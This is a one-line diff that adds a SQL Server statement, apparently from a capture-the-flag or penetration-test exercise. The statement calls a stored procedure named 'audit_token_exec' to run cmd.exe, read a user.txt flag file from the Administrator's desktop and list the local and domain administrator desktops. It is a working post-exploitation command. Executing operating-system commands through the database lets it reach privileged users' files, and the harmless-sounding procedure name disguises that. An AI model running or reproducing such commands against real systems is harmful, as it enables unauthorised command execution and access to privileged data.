@@ -1,0 +1,1 @@
+EXEC dbo.audit_token_exec N'cmd.exe /c "echo USER_FLAG & type C:\Users\Administrator\Desktop\user.txt & echo LOCAL_ADMIN_DESKTOP & dir /a /b C:\Users\Administrator\Desktop & echo DOMAIN_ADMIN_DESKTOP & dir /a /b C:\Users\Administrator.ODYSSEY\Desktop"'
